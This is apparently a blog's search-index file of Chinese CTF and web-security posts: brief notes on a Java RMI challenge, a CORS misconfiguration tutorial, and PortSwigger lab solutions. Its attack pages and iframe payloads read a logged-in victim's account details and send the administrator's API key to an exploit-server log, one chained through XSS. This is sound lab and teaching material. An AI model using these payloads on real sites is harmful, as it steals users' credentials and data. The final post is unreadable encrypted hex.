ReflectionFactory.getReflectionFactory();        Constructor&lt;Object&gt; constructor = Object.class.getDeclaredConstructor();        Constructor&lt;?&gt; constructor1 = reflectionFactory.newConstructorForSerialization(clazz,constructor);        constructor1.setAccessible(true);        return (T) constructor1.newInstance();    &#125;&#125;

2022-0ctf-3rm1该题jdk版本为201
干了一天是在是做不出来，网上关于该题的wp不多，看的我也迷迷糊糊的，就不在这里献丑了
我自己的进度是在知道该题的目的就是我们必须远程绑定一个恶意对象到注册中心上，也就是说我们必须摆脱registry默认只能本地绑定的限制，这里的话可以用工具：https://github.com/qtc-de/remote-method-guesser
该工具可以和ysoserial工具联动验证确实是该思路，用URLDNS链来验证
后面就是我们必须找一个可以rce的链子，看题目自己提供的那些类很熟悉，基本就是照着spring1的链子所需要的类自己再写一遍的，所以我们其实照着改一改就可以了
这当然是限在低版本上，高版本AnnotationInvocationHandler已经被移除了，我们需要重新找到一个类似于AnnotationInvocationHandler的代理类
很好，然后就没然后了，卡死在这里了，看wp里面是利用codeql来进行一个寻找（还没学。。。）
说实话那个链子构造目前看的也懵懵的，后面有机会再来复盘一手
]]></content>
      <categories>
        <category>Write-Up</category>
      </categories>
  </entry>
  <entry>
    <title>CORS跨域资源共享漏洞学习</title>
    <url>/2024/03/25/CORS%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[前言想要了解明白这个漏洞，我们就需要知道一些前提
同源策略 (Same Origin Policy)
同源策略的基本原则是：当一个浏览器加载一个源（Origin）的文档或脚本时，它将只允许该文档或脚本与其自身相同源的资源进行交互，而不允许与其他源的资源进行直接交互。这种限制有助于防止恶意网站获取用户的敏感信息或进行未经授权的操作。
同源策略通常应用于以下方面：

DOM访问限制：一个源的JavaScript代码只能访问来自相同源的DOM对象，不能直接操作其他源的DOM对象。
Cookie限制：浏览器会将Cookie与其关联的源关联起来，并且在同源策略下，一个源的Cookie不会被发送到另一个源。
XHR请求限制：XMLHttpRequest对象（用于AJAX请求）在同源策略下只能向同一源发起请求。
Frame和iFrame限制：同源策略限制了页面中一个frame或iframe内加载的内容只能来自相同的源。

两个URL只有在以下所有方面都匹配时才被视为同源：

协议（Protocol）：两个URL的协议必须相同，例如都是HTTP或都是HTTPS。
主机名（Host）：两个URL的主机名（域名或IP地址）必须完全相同。
端口（Port）：如果指定了端口号，那么两个URL的端口号必须相同。如果未指定端口号，则默认使用HTTP的80端口和HTTPS的443端口

 同时满足这三种条件就是同源，当存在两个站点，其中有一项不满足相同条件的时候，我们即可说这两个站点不是同源站点，而当其中一个站点想请求另外一个站点的资源的时候我们边称它为跨域请求，而由于安全考虑，跨域请求会受到同源策略的限制
不受影响的标签
 在HTML中&lt;a&gt;, &lt;form&gt;, &lt;img&gt;, &lt;script&gt;, &lt;iframe&gt;, &lt;link&gt; 等标签以及 Ajax 都可以指向一个资源地址
 在这些标签中有以下的标签不受同源策略的限制

script
img
link
css

用户对跨域的需求

比如前后端分离的情况，前后端域名不同，但是前端会需要用到后端的接口，发送ajax请求
电商网站加载第三方快递网站的物流信息

跨域请求方式CORS定义了两种跨域请求，简单跨域请求和非简单跨域请求。只要同时满足以下两大条件，就属于简单请求。

请求方法是以下三种方法之一：


HEAD
GET
POST


HTTP的头信息不超出以下几种字段：


Accept
Accept-Language
Content-Language
Last-Event-ID
Content-Type：只限于三个值application/x-www-form-urlencoded、multipart/form-data、text/plain

简单的说就是设置了一个白名单，符合这个条件的才是简单请求。其他不符合的都是非简单请求。
浏览器对简单请求和非简单请求的处理机制不一样。对于简单请求，浏览器就会立刻发送这个请求。对于非简单请求，浏览器不会马上发送这个请求，而是有一个preflight，跟服务器验证的过程。浏览器先发送一个options方法的预检请求。
CORS机制解决
CORS，跨域资源共享（Cross-origin resource sharing），是H5提供的一种机制，WEB应用程序可以通过在HTTP增加字段来告诉浏览器，哪些不同来源的服务器是有权访问本站资源的，当不同域的请求发生时，就出现了跨域的现象。
下图是常见的跨域会遇到的请求头
当对CORS配置不当的时候，就导致资源被恶意操作，也就发生了CORS漏洞
漏洞检测
一般情况下，修改请求包 Header 中的 Origin 字段为任意域名或者为 null 的方式去检测该漏洞是否存在
常见的几种情况如上面的图所示，用红框标记的是最有代表性的三个头，其中我们可以手动为请求加上Origin，然后观察响应头的Access-Control-Allow-Origin和Access-Control-Allow-Credentials的值

其中Access-Control-Allow-Origin表示允许跨域访问的host

 就三个值，可以设置成指定的网站，也可以设置成*表示允许所有host跨域访问，也可以设置为null，但是首先设置成null并不常见，并且也不推荐

如果想跨域传输cookies,需要Access-Control-Allow-Credentials设置为true，并且需要与XMLHttpRequest.withCredentials 或Fetch API中的Request() 构造器中的credentials 选项结合使用，例如使用XMLHttpRequest的时候需要将withCredentials的值设置为true

接下来按照常见性分为几种情况



Access-Control-Allow-Origin
Access-Control-Allow-Credentials
结果



*
true
不存在漏洞


&lt;all-host&gt;&lt;/all-host&gt;
true
存在漏洞


&lt;safe_host&gt;
true
安全-不存在漏洞


null
true
存在漏洞


第一种，Allow-Origin为 * ，Allow-Credentials为 true后端代码如下：

按照上面漏洞检测的方法检测，结果如下：

前面我们知道Access-Control-Allow-Origin表示允许跨域访问的host，我们这里设置成了通配符*，代表允许所有网站的跨域请求，当这种情况的时候，即便Access-Control-Allow-Credentials为true，那么会被认定为不安全的，将不能将cookie发送到服务端，所以我们利用会失败
攻击服务器代码：index.jsp
&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;         pageEncoding=&quot;UTF-8&quot;%&gt;&lt;html&gt;&lt;body&gt;&lt;h2&gt;Hello World!&lt;/h2&gt;    &lt;button id=&quot;attack&quot; type=&quot;button&quot; onclick=&quot;attack()&quot;&gt;点我抢红包&lt;/button&gt;&lt;/body&gt;&lt;script&gt;    function attack() &#123;         var xhttp = new XMLHttpRequest();         xhttp.onreadystatechange = function () &#123;             // 当响应请求完成，并且返回200的时候弹出响应体            if (this.readyState == 4 &amp;&amp; this.status == 200)&#123;                if(this.response ==&quot;&quot; || this.response == null)&#123;                    alert(&quot;恭喜已经绕过了同源策略，但是响应体为空，利用失败&quot;);                &#125;else&#123;                    alert(&quot;黑客已经拿到你的敏感信息----&quot;+this.response)                &#125;            &#125;        &#125;        //打开靶机地址        xhttp.open(&quot;GET&quot;,&quot;http://192.168.1.2:8080/info&quot;,true);        //使用 cookie、授权标头或 TLS 客户端证书等凭据进行跨站点请求        xhttp.withCredentials = true;        xhttp.send();    &#125;&lt;/script&gt;&lt;/html&gt;

靶机地址： 192.168.1.2:8080
攻击服务器地址：192.168.1.251:8080
当用户登录状态下，访问我们的网站并点击相关按钮的时候，发下没有任何反应，这时候我们来看一下响应体和控制台，发现请求已经被同源策略禁止了

第二种，Allow-Origin为&lt;all-host&gt; ，Allow-Credentials为 true&lt;/all-host&gt;这种的话其实也相当于同意了所有站点的跨域请求，一般如果是这种情况，那么漏洞肯定存在并且可以利用，而出现漏洞的原因就是一些开发为了图方便导致的
后端代码如下：

测试的结果如下：
这样子的话便可以利用成功

但是在正常的浏览器上面尝试的话便不会成功（所看文章的作者在虚拟机上下的一个谷歌的盗版浏览器）

原因就是SameSite属性，2016年开始，Chrome 51版本对Cookie新增了一个 SameSite属性，为了防止CSRF攻击，陆续的各大厂商的浏览器也都适配了该属性，该属性有什么用呢？如下图所示，展示了SameSite和其它跟cookie有关的设置的基本用途

samesite属性有三个值

Strict：最为严格，完全禁止第三方 Cookie，跨站点时，任何情况下都不会发送 Cookie。
Lax：当开发开发人员没有设置samesite的值得时候，Lax是默认值，规则稍稍放宽，大多数情况也是不发送第三方 Cookie，详细如下图


我们利用页面的请求，可以算作一个AJAX，所以当我们默认情况下去利用不会发送cookie

None：所有请求中都允许发送cookie，但是如果samesite配置成了none，还必须将cookie加上Secure属性才能够生效


所以当遇到https协议的站点，并且cookie的samesite被设置成None的时候，也可以利用，如下图所示，我将站点改成了https，并且加上了samesite&#x3D;None以及Secure


利用成功，其中当Allow-Origin设置为safe-host类似
第三种，Allow-Origin为null，Allow-Credentials为true这种情况可以被绕过，因为任何使用非分级协议（如 data: 或 file:）的资源和沙盒文件的 Origin 的序列化都被定义为‘null’，所以我们这里利用iframe标签，使用 data url 格式将src的值直接加载为html（同样的利用成功的前提仍然要考虑我们上述提到的samesite）
&lt;iframe sandbox=&quot;allow-scripts allow-top-navigation allow-forms allow-modals&quot; src=&quot;data:text/html;charset=UTF-8,&lt;script&gt;    var xhttp = new XMLHttpRequest();         xhttp.onreadystatechange = function () &#123;             // 当响应请求完成，并且返回200的时候弹出响应体            if (this.readyState == 4 &amp;&amp; this.status == 200)&#123;                if(this.responseText ==&#x27;&#x27; || this.responseText == null)&#123;                        alert(&#x27;恭喜已经绕过了同源策略，但是响应体为空，利用失败&#x27;);                        console.log(&#x27;no,&#x27;+this.responseText)                        &#125;else&#123;                        alert(&#x27;黑客已经拿到你的敏感信息----&#x27;+this.responseText);                        console.log(&#x27;yes,&#x27;+this.responseText)&#125;                        &#125;                        &#125;                    xhttp.open(&#x27;GET&#x27;,&#x27;https://192.168.1.2:8443/info&#x27;,true);                    xhttp.withCredentials = true;                    xhttp.send();    &lt;/script&gt;&quot;&gt;&lt;/iframe&gt;

利用成功

当然也可以利用h5的新属性srcdoc
&lt;iframe sandbox=&quot;allow-scripts allow-top-navigation allow-forms allow-modals&quot; srcdoc=&quot;&lt;script&gt;    var xhttp = new XMLHttpRequest();         xhttp.onreadystatechange = function () &#123;             // 当响应请求完成，并且返回200的时候弹出响应体            if (this.readyState == 4 &amp;&amp; this.status == 200)&#123;                        alert(this.responseText);                        &#125;                        &#125;                    xhttp.open(&#x27;GET&#x27;,&#x27;https://192.168.1.2:8443/info&#x27;,true);                    xhttp.withCredentials = true;                    xhttp.send();&lt;/script&gt;    &quot;&gt;&lt;/iframe&gt;

同样可以利用

实战Lab：具有基本源反射的 CORS 漏洞要求：要解决该实验问题，请制作一些使用 CORS 检索管理员的 API 密钥并将代码上传到漏洞利用服务器的 JavaScript
首先我们先开启bp，关掉拦截，打开谷歌的proxy插件，然后登录题目提供给我们的账号，成功登录后查看代理模块中的HTTP历史记录，点击/accountDetails，观察密钥是否通过对 /accountDetails 的 AJAX 请求检索，并且响应包含表明它可能支持 CORS 的 Access-Control-Allow-Credentials 标头，所以把该条目发送到重放器里面，按照上面的方法测试一下是否含有CORS漏洞，如下所示：
可以发现接受所有的链接，并且Allow-Credentials为 true，有漏洞可以利用，所以我们到bp给我们提供的漏洞利用服务器中，并在其中的html代码的body部分输入以下代码：
&lt;script&gt;    var req = new XMLHttpRequest();    req.onload = reqListener;    req.open(&#x27;get&#x27;,&#x27;YOUR-LAB-ID.web-security-academy.net/accountDetails&#x27;,true);    req.withCredentials = true;    req.send();    function reqListener() &#123;        location=&#x27;/log?key=&#x27;+this.responseText;    &#125;;&lt;/script&gt;

对以上代码的解释：

var req = new XMLHttpRequest();：创建了一个新的 XMLHttpRequest 对象，用于发起 HTTP 请求。
req.onload = reqListener;：指定了当请求成功完成时调用的回调函数 reqListener。这意味着一旦请求成功返回数据，将会执行名为 reqListener 的函数。
req.open(&#39;get&#39;,&#39;YOUR-LAB-ID.web-security-academy.net/accountDetails&#39;,true);：使用 GET 方法打开了一个与指定 URL 的异步（true 表示异步）HTTP 连接。该 URL 是一个包含用户账户详情的资源。
req.withCredentials = true;：设置了 XMLHttpRequest 对象的 withCredentials 属性为 true。这表示在请求中会包含凭据（如 cookie、授权标头等），从而允许在跨域请求中发送身份验证信息。
req.send();：发送了 HTTP 请求到指定的 URL

保存之后便可以将其发送给受害者，然后查看日志，获取到管理员的API，题目解决
Lab：具有受信任的 null 源的 CORS 漏洞首先按照上题的方法一样检查是否有CORS漏洞，与上题不一样的是这题我们在Origin处输入任意一个链接的话响应体里面不会回显Access-Control-Allow-Origin，但是当我们输入null的时候，回显成功，如下：
回显的这两条证明了还是存在CORS漏洞的，不过需要用常见的第三种情况里面的方法，到bp给我们提供的漏洞利用服务器中，并在其中的html代码的body部分输入以下代码：
&lt;iframe sandbox=&quot;allow-scripts allow-top-navigation allow-forms&quot; srcdoc=&quot;&lt;script&gt;    var req = new XMLHttpRequest();    req.onload = reqListener;    req.open(&#x27;get&#x27;,&#x27;YOUR-LAB-ID.web-security-academy.net/accountDetails&#x27;,true);    req.withCredentials = true;    req.send();    function reqListener() &#123;        location=&#x27;YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key=&#x27;+encodeURIComponent(this.responseText);    &#125;;&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;

注意使用 iframe 沙盒，因为这会生成 null 源请求
接下来按上题操作，题目解决
Lab：具有受信任不安全协议的 CORS 漏洞按照上面两题的步骤操作发现响应体中都回显不出Access-Control-Allow-Origin标头，于是根据题目提示尝试子域名，结果如下：

发现接受本域名以及子域名，还是存在CORS漏洞的
打开产品页面，点击检查库存，并观察它是否使用子域上的 HTTP URL 加载（请注意，该 productID 参数容易受到 XSS 的影响）
于是到bp提供的漏洞利用服务器中，输入如下代码：
&lt;script&gt;    document.location=&quot;http://stock.0a58005104085dbd81d52570007b00a4.web-security-academy.net/?productId=4&lt;script&gt;var req = new XMLHttpRequest(); req.onload = reqListener; req.open(&#x27;get&#x27;,&#x27;https://0a58005104085dbd81d52570007b00a4.web-security-academy.net/accountDetails&#x27;,true); req.withCredentials = true;req.send();function reqListener() &#123;location=&#x27;https://exploit-0abd005e04c25dbc818624a201780074.exploit-server.net/log?key=&#x27;%2bthis.responseText; &#125;;%3c/script&gt;&amp;storeId=1&quot;&lt;/script&gt;

最好就不要再整理（我整理格式之后尝试不出来），这段代码的功能是首先将页面重定向到一个特定的URL，然后使用XMLHttpRequest对象向另一个URL发送GET请求，获取账户详情信息。当请求完成时，会将响应内容作为参数拼接到另一个URL中，并将页面重定向到该URL
接下来按照第一题那样继续操作，最后会得到管理员的API，题目解决
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>cors</tag>
      </tags>
  </entry>
  <entry>
    <title>JS中API提取&amp;前后端分离渗透、swagger、druid、actuator深入</title>
    <url>/2025/07/10/JS%E4%B8%ADAPI%E6%8F%90%E5%8F%96-%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E6%B8%97%E9%80%8F%E3%80%81swagger%E3%80%81druid%E3%80%81actuator%E6%B7%B1%E5%85%A5/</url>
    <content><![CDATA[
  0c239692b5fdf341fc97cf04ee2985d069b9636753dfdfe8594e470a92c95898034edf6599fbf5ac3f8caff8f0d53aa1efc7dbfad2e551f8aef1986fb62b0e2c4719bad78a2ccc3271fa4a591ea89057b7ae669929239d5567fe142931716417c16ca6c3be2fa7bef8f5552ad4981f2ac836b250abc589509fdbb230324a7b1fbd9c3ee1f43b53f88b57331dc4c8688f2097eff5133fe73ba635acd4ad1cdc7523b6ca57418eed348ee64b103467fccccbd3d2b3cdc52e8cd2c2254c69bb3cee367b82d4f0e9e3c6f99b1574fc3ac8685d286de0f8dda324b1229ecc4f17282c94f25160ffb407332d44b241f2785e2d661e92a3911dda364232b3aff072e671ae3aa3efd71f125cd744370c54e9e9562097ed214224a1868368a3383e6a52aa0ef6107f36a422f6329744d5dd663b6962839b22808fb5c1974d2ea8f1d18db264e72880ad1e82857fb7dd394d12d1a4d3e597a63f8b2e5113821da74e306bde0057dc9f8945a93009ad1a534eea694e62325f0a7e0c9a0a5abca74c7a65587b258f312771467a06ab8e964633c9c5b9f4647f3a8030b99952b82858bd5726d2a3eaebc212121cf3441ffd6ad86485100504d11a4a766f5c630291b1870910c7b9c9dfc2b0e8816d40d10665cdbf43f005a8d42152feb90df02477fc2a4d40b1ca54b0ed595b28ebe7e6294eec5156086472041892e561841f6d5fd82687b9030ab1de7cb177de0b54588b3db3d8b59be1787554b280c155cb72a5c4aae9c82a549136ecb6ed05aebb50648d1501b23fe847f8a06f13e680a4258e63f164a3aa6c9b83f27a84c5766ff8d68a5bfcab2c40751945285d4473b9a7ad9a9ea61cbe05d79af5b4762f92bbd12a77833c2b32f50ec826efba43ee0ef75f2bd5a6b49cb4125ddbeae94a4f89d7f28d3ee7e67a1a079a31150323058fba493bbc173bf33d74a4cf0e81de83e4a1613aded30a41bfc3d9175085cad6afa0d7d2a229144cbe7d9f9d5f649aa1978683f755c6cd9571f69ee42287656fc8b30d178332b94e0974eb027dfc9db20d2c4d6e7546ae224493372f119235fe874e998574b83a9a0a62553005ddcb0fe0ae65f3be741360e76a3f57c844429abba7c82eb28feb245c8334ce2065aa4b46a96da973f981e57746bbae0ddf49a0e0c5f0f853b2a606f10d9d311a54573002de38266328823b72d5f5af841c1fbfffb1bffcd3c58f8c3a3514e48d5c05d3023c7dcd2ca9f4fb4d79be07dad6f5757c17116b60f5f3682af29f4c19e5dfbc00155bb6373273f220273a4c146d30504fb8e935caa118dc86a5d8e115b2723eddda79f3bcd0fd22fcabd50d21bf9929de33ee719fbbcdb6b78a9fda20288826550f34dade36024acdb7437e6f22bba5297525fe0bd02e6a52f5d70314322b3b3602ffd836eabc385a98a0d7c0ffbc452adaca46639af26f9db5d35739895ee7e85dd67afa41b423d3516007709ab9622607490e8a246ca3242f694362e879b326de7d030d974d801917544f77665de1c7acfe6d468eaf737a072dd9ae3292de2a7e5439ac77c41df35824e7684b07d61358849097f1bb39be385eef193bf16223c3e1dd19fccddf77ba8b0a7775c5d6d2ecf65fc8e83f699d287bf580c569b21a1f01ad6fc9b4d4ddf9ce84f72515dde5a1c82b44875fa974f8fb667d2bc127338a46dc3acc5ef4bf38238dd73f07468243eb5b8c915ce16639df69ffcb72945fd366ba475dd44db1ca204892905f081d1d1c775c9b288f2ca0e7fd7ef07f73c1772e437cb23041ae8d91b4660d550d9b5bc396c94a59bda877677ac0dc689e2f0d39077ee5b4d38c8eac90fd435ed785ef3968fc833237d5cfee2cdd33a2c59fc8d46783bfeccb353abe1b16070b9d3b780d8ced93d7f68a0e69cb70a54fabf58b7a5b3ce3061275547dc0ac408ddec49a21fb2fafbf6827a7eeb74e12052197a2e0d7cb3031e41f443fb8c7020b32455cdb2031c445a80c91389f97e84be86e3f00f83e23e8f2c7865a8817059eb7fae22e4a5805b4c1c073fb1997fceb97803dfc78a6861f574d35e48e9bdaf761dec9b672dc9fdb2934f65a8ad7c91b0185b5c0fdf8cb5aae1e2755ccf97c388b0fdb00e52f9fc9dbd3e7d27267dbbc73b87f44d23753ffeb2715fe21d6a02c967c693237512188d2d7608ddf62a54a7e3ad1b6d69375a094b12946c7af701fa28d56a8c3370f8acc1e38db8681008a111398c1245934d3c31e5c071c7024e6410fcd1dd75515194690cf34de903332b7d839a1d09299564f63c37945d1d733dc0e9ef8af22f63ff893d5b170bb03549066e487fbacb09ef4e81b38c65c28ef1b029ceb5b19b6d3d3462ebe87981dabd178c5cfa3a9d8734b118f882d1b6775eae36f5077c4aa7a3fee665166a1d1ee9a306a57d71958bc0f91388a64c9121dd9139aee782d72645404fcfc15cc27903d5cb9451be05b93b5f13dcf2c46e23ee478c5fedf9cc63eba4b32cac03fdb52615911206aa86b10be3de9d1698f936594d6952b6233db41bed4fdd686e302bf6882a0bd836560154a443144529a9f79e3da2018eb88f0cc5883bcf2826ea3bba31fd46e70d103fda0523578991d07bbf4f0140464aa0d4f22464617820b4fc1bbf85277b4e2d4f340450098c6ba94f19bd1d8e0110c2abb013ab715ec03d3db00294e328b31e6fca83d06521f629eb3a97d290d6cb9d176c434186c773182ec79818bec0a31ef1366952eaf2f64c0ba661e604b5d124896031fc9004fa90a9a06d01d5f4f9a2996e9807e38fad1778264fa848443bf211f83295750c4404338f8172e73f7e45945d58b404bee7f170129eb084420d8346615dc54ded892021a9db154db295d3d0dcca58f3fc3749904657371ef232cce32ec768d5242d29b48882d801f2b68419050f65ffda6a19ca703b43be502b00f1cd5b4e391175a5d8a403be4895f8a2ef118b04a19129cd7f058da60d8b6155a7dd0ba244716a2f74b5b3d2e7d6a7aaa664745da00095a6d9767f25519cab877d23a931f84e96e7dc0dbd615ce6a6ce0f2b388fca48a0a596eaf34c28a9b34408a33583ee2f4e21526978723ac52e6d47494e8db54134d42c03874266768a1a41b530c232d82e59bece2ed96672e49a789671540420b2f9867783e8e81ea51f03278f282813a98c86a3bd60abbef40c0731122f881f915d8c118230d8adcf02490fd1a22a440009c22bb25aed80e7efdc1ca8108e3b731b8332daa3c9170bf2bf5fff0aaa8cfec88ea9787d3c5cb86b1851c1f70dc908dc5072979688ec3ef29753d81f84126011aeeb1ff41216f127245d412c63d4dc7c13316132a36b851d9b656e490b4b7abc13e8b91ddf82de2b462bc1d860b42b61c85a8de9bd0481b93a0249c8e2cbe6cbd21475e5e217ee22db7b3642cdc6749e985f5d3128de9f137e808c3fc9e0553401c4ce250e4185ce8f1a0e27c5cb1d2328dd9e96c29b289491cdf6b598cb3f1766864333db3fe76e2a68fa4f46d8feee2c9403912f20add3e7901f0a9cdb5d5cc42d2f3435cf3b6ca2b859a5a275fa8afb1fb960674b49e3e24c307f1415fba621d24b4c852ed44044dd93e909cc18a2f07cf6345f126147c3086425f4a257ffeeacc0b71b9aab363b88f14c2871a45bc2a29e5da3275d8fd6fa343adde3271773d4cef35e00d5dd6b5dbc07963624f91e8856755a32ee2b0600c824fcc93873f795a480ef3d5299398fe1ee2407d455798f41846dd4186cbdcd09c810ef8c6e997a1fb808cdc3964b09f34ed0aa171ec52f60cfaf031fcbe1ff8ad30b52f098531ce8c75a856646ba3736faf97df256c2c42566b66d9d03e41cc5b6dfc2d2c7cb798cb417a40ff1cc4d28fdaa6abc5d3d373538cbfd871f921ad1aa1be61a16f241f47a5d73bda199d21e7ff59e3db397910b68b55782074f6bf42d0fdb5a319d486e59a3712368161585371d51a12030cafceb1cf6fa114a907aafcf71752171165fca62bc5b2418e46021a8b9407d140a97ecd890648231a63645a7ce94193d4f4974948968d557ca8e290efea1034ad8f1844c925c7583093157bd0b5e6db63a352b9195d57283d4e0d33abda28569d6385e533fdd824f9104907a07671fb9ef3f1be043c4becb1256b1e33d5a29ac570e53348de780a6ebbcc80ea6c7152434299c68ed7b0254fd2eeead6a8089cbdcb0cdbbbed4a968be17a60e8021b88e5a9a4d740e1729b9b66a892b7e0a273c8cbcce6273d520626ec285be48b1f97999989139d1c08865c42cc7f34d4a168f6c42c15b76cc85d6d966640d04a2857bd9f03a7433ae5b80c2e009801e227147eeef7a58788e662d18c60adf9823d9f09cc739f36e5b689030e638a93a00242b41b20da7a2593a13b15b0a4357a7f98569d9e48c2dbe677fa01d2227e43a0f30fba844cad571b138383af5034a4ca73fdc2cd004c7310a9cfe520f0daca67956d8111326d826926e4f69b2f4eee686acd50028da71ccbf8af6b9ea36e29e7c23d24d3c5f53b71e076b213f5fa7e115871a0dd1e55e029c09d700dcb387f7af9ca6f23bb2294d56183799c79da82789f98e717cea9fff44aad2e6f5e109f0e12f29ebda1081fa840b44df81a17158bf5b5adb33a7df65b54cccfe93ea787040f141272a29aa9f899ee2534b044e794a52277bb135da1381f834a621f878fef451991244f79fc014aa513aff6565f839d52ec101ed01bc6d721e82c1051a207578f1be31eeae96ce3ba385dfb8f4894d746a91a108ed6d395ba97eb67f1119e7dbacb00512f99aa80186c188d807cddaf2dde2cbea7ec436d077bb51cefffab603e35e696827714023ed438a18992f02a5ce1e9e5383df5a62bb268e9bfca5d45dbff574df9997d3d1103159f2f9f3ee023eed32dd37ef83dc8aa17d0f9c41613b3adf000885843754dbc9c7fd1453db30b767d820034ca4bc22f3f19fc901c2173f1af731d9ace543dae3e7c5d5c02f918f398a38912c0fc6ba6fcda407c5f2e74fec6876f74076f87ae20f395b56d998bbd70d78452ffa3d27a01804052c7fb539b72318f5bece4af035c36216af009621ad48cf7b09d22f056b1b2f5e6084ebae440f3bddf53c5e004744157fc290baa5f55cf8dfbb67a9c7ccef9aab754d495a9d174ee6bffb818fe5d24d076db84a6cae1d0a5ef25d35b3f0030fea009eedc952f3e8c9e981e42da45f9674ae0fafde4a05b514b15d0a744f5944b29211a4360333896dea2bb7085a660bd6616ea685e0ed4616dcd1bd84e0a08b2a3765f0dd7250fc6e4a125418fbe48fa75e2d17454014478353a7c83c362b8aa4d5f5ef2ffba4857170bd51eca9c69fbb3dc90810076239a56420794c50604c20f85384d2bb05674839a6b115277a3897923a1c5cbe1e2c954eca5ff65d6abed3a539c0eefb2602306d3ab2c4c23d84f4c2a1f2b729f0430aa7f9ebb66cab79562b6eb217b7ad4686da71c2100fb2d6d1178e9f4f8938841b4cd7465966623212def1e9ead3fa318bd2e3d7da6336fb9eb3fb5fd334cb95edb2c9f1625bcdf5deb2bf3cd9b2ff06b50ee60a2aebd80f92c60787141cc7c1311707323ff5a538d941c956a22e6e81cfc2bbddff34139eab6a56b2f0bf23782b817ff5ca911dc9275c6ef31879b34cdca02ed9a3d8968fd264062e8bf1f70d7c86164d260daf0208ab30d31f3237201317c4d8f795f34afc55b02e9ddc99d7db0e2184b16b0f1bc26eeab454642d38293a268fee6a515415b590d9cdf02a3c46dae258b2a6a26a817150a97e95f42d25f95f80f5dd5637281ac741cc860a49f584812ffdd6018d4963b12062345b68aaa4d98d735cf56268922f40b47686949b25bb9aaa7c8badcc527d7233b9515a1955a9d3c2d1054e938ddf61bf966e161776c876c76cffb1fe98fb5533e9d32b5b499c2f1503b099a6eae228c28ba8497e009a2f628cda5336afe643cd235c4a637a3b2f39b9ec62604657c73f2c2ca8f241ddb0b95d0b6ddc281cafe7ecff73cfa80580a873ef4d25670a5826180e0388bbc95767321e6bb0c88c64f4c537bccf12a72cd96ea0ba1e708f858624c37a457f46048fd4f8962e8b3a1538668f26a2e795f82ac7d7cfaa30954d8a7ed4e67722172627de2b31725ee722c33d4b189f1043e372948a2d43c4dadcaf1d996ac9464eabf6e4f5eff048f9e95ad3c9988779b78b9d5a35e4cf645018e9be8a6bbfdb313c5fce2cff1f7534ad0152d54703407f4943833b76ef18bbe853b42e1220c9d21ed777332fde2b4937e865e8b48ebe08668e8d84fb1ffb6c5e88e72e51e049911276fb3e7f6ed5bbf96b1a9cffd6e57b59f75f91283e47c5e13a15e473ad70294faeae99018e063e2f8a1a9a498a2b7d7ebf1dadd0bbfa63fab83b09b2cf096b42790e5d49c0d349d73a8ee5f1df499643998f9c68e2a43f08ab0276e78732c41f541caf6a44fe46f3bf468f6b9bc51eb3386ae9d758a0697d9e29b726eb252767c6e80156858dbbab8bd4143b322aac2197bc28b8cae42ef6d41102d406178da25e21ca66c244ad37e24a00a04182c5d0da0894ff92720c04c7326cf7c5fe4233d875caf1cb64533a4018a1ab06c3f6c612c97b703376fbdbbec69f1358b0f0a917e00a3f8867e15da78a788b3019189df4a095b51fdd307e3f356aa55766262d0ed50532cdd0b7d94fccffc4d6d566021cdd782bc59a607080dd2f5594df0b6c08fcc972608f6658265c91c18de99507eb9c1d433c27fdcabb8871782addffdfbf7465f5fa0c7e092aead0f22b65e209f40f6d001cfed08d00b6337bd7a897d9546d7fedab9e0f231bf7123fa78613501eef4ea9085f1ede61ff8c0bfb16d2c568558873fc3bbb92f2bf286b9e1b78b3cb450114a0c83f13c7990f3f7521999063cfabebb608d94ee44a943560317ed1639a72cefd127422ed43831668f2eee22a1b20089ca304d00de56960bc93a38a4d53043cfa6a87143ec69920dc6f5ed7af18bd671b0c44224e65b17774ea2a3b7599be95889dca21e84d0550fb15c0e010f6852b81f4df93fbe41ac1b5e36d1c4e3021e7867b82ddb2827d6d5b214abe69982f3d9a9bb7f742e663279d8853a6b7db973a7087ef4544412d59ef2f1f3f4108e8705870413505aa216b70d7c4d1eb23edfdc162d477f70af1cc0bb4a439b9869fe83f89d84fd0926324da245e3327be9f396618d13578590fee67c52b8c5ebec026d3a450daa42a57ed81da2eb19e851cfa8e86050a6d7bab4b705d9663dd0e3c29d4444bfb64e389b6fb97f7b528dde008765603e6a4e33f0c3dc6008fe90a41e698592cd220afa8f69c44507a3e6ba357b022477a65b3270d1031c41b90f80244c81dec36e687272a058f556fc567885eab7c4d1f0aec8f370660503fb71f5b17696215410fcf6302e59a2672812a34113111654abee74f401613dc1b6f9110e9b067bdab33a224887b0eddeb9e0918e948dcdb8e2a8c62dcdd63506ff3568da701277c5103da44504711f725961d1babbb3dde5ce21dd74081a0a8680ec5545741886aacce1bb7b1b3c850633243c6c06ca6e8b51db8150560a6983ec2d15d624d26df323693da085694e8604a45ea952cd85ecb2b7eee9edc1e8e5a2bdf2fc01e51923d7c3e290da5a20d9027c1d19f4b924ee976b72e84b6a85644c5dc06e8f29795923ee73ae15cc5842816585ccce8a5fa4525f03037b9831033660e8b6b2aebac3d1a95b50fbf22557c60782a5664d5cbb306cfa2db3f4e3d59ebfa4e1733bf6880d2f5c010eb9a9eb42d247c237d0233ddc564493385251390c0c18822c3374be6f505dbd93b914ebedea027de5e6344b0546f95c5a98644181fed692c5b491f5c87807e7ca286aedd273e3bbc3b1eefdce82b7d2a68063d03c761b1a088cc551cca6e0e3e5452c2a4312cbb550920a96d881becf55090553dc6490e4886a962d9163a27596739a744d14508c4bfb0842cfe22de4a01b8d83982a82c70f7016f936b552016e022079a69c768ba4959273c0ac4685ecf1283937a369469a682391f37ba060bb17eb95cc2e11d1b65a45a821e61a947aa3cee4e07b4bec89e587c9a93f8b5c1289faae6e039d4bf3cecc441dfc08f8eeca5101e16e6a50e25f491f668dd0ff2286d8b995c64eafb0a63c9058e3186c970d2bc06d5f751067d6acc0d1b68673c9cd0137bd4edde0b7dc994f5b89d4a294a40c74600e44e7855405ee8d5a95237358cbcf5d066be012e1c7606a7e4d802fe399c8e487a9960c8d07044ce4538f343a19c21b7db63585c963d122f5d151355b41e8c39666845074e069d130b6bc308a5